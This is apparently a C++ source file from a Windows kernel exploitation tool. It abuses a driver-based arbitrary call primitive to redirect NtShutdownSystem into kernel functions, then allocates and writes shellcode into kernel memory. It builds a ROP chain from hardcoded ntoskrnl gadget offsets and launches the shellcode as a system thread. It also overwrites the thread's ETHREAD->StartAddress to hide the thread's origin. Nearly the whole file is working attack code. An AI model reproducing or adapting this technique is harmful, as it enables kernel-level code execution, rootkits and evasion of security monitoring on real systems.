#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();

    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ExAllocatePool2");
    void* ShellcodeAllocation = reinterpret_cast<void*(*)(std::uint32_t, std::size_t, std::uint32_t)>(NtShutdownSystem)(0x80, 0x100, 'Thre');
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Shellcode @ 0x%p\n", ShellcodeAllocation);

    if (!ShellcodeAllocation)
        return EXIT_FAILURE;

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ExAllocatePool2");
    void* StackAllocation = reinterpret_cast<void* (*)(std::uint32_t, std::size_t, std::uint32_t)>(NtShutdownSystem)(0x40 | 0x2, 0x3000, 'Thre');
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Stack @ 0x%p\n", StackAllocation);

    if (!StackAllocation)
        return EXIT_FAILURE;
    
    // Write shellcode
    std::uint8_t ShellcodeTemplate[] =
    {
        0x48, 0xBD, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, // mov rbp, StackAllocation
        0x48, 0xBB, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, // mov rbx, address of 'leave; ret;' gadget
        0x53,                                                       // push rbx
        0xC3                                                        // ret
    };

    *(void**)(ShellcodeTemplate + 2) = StackAllocation;
    *(void**)(ShellcodeTemplate + 12) = (void*)(Driver::GetKernelModuleBase() + 0x57f99c); // leave; ret; gadget

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void*(*)(void*, void*, size_t)>(NtShutdownSystem)(ShellcodeAllocation, &ShellcodeTemplate, sizeof(ShellcodeTemplate));
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));
    KernelStackManager.AddFunctionCall<std::uintptr_t, std::size_t>("RtlZeroMemory",
        reinterpret_cast<std::uintptr_t>(ShellcodeAllocation),
        (std::size_t)sizeof(ShellcodeTemplate)
    );
    KernelStackManager.AddFunctionCall<std::uintptr_t>("ExFreePool",
        reinterpret_cast<std::uintptr_t>(ShellcodeAllocation)
    );
    KernelStackManager.AddFunctionCall("PsGetCurrentThread");
    KernelStackManager.AddGadget(0x256c4a); // pop rcx; ret;
    KernelStackManager.AddValue(0x4e0); // 0x4e0 (offset to ETHREAD->StartAddress)
    KernelStackManager.AddGadget(0x28efa4); // add rax, rcx; ret;

    KernelStackManager.AddGadget(0x2f7921); // pop r8; ret;
    KernelStackManager.AddValue(0xDEADBEEFDEADBEEF); // New value we write to ETHREAD->StartAddress
    KernelStackManager.AddGadget(0x3c3a81); // mov qword ptr [rax], r8; ret;
    

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(StackAllocation, KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    Sleep(500);
    std::cin.get();

    HANDLE KernelThreadHandle;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)ShellcodeAllocation, (void*)NULL);
    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL
    );
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    
    return EXIT_SUCCESS;
}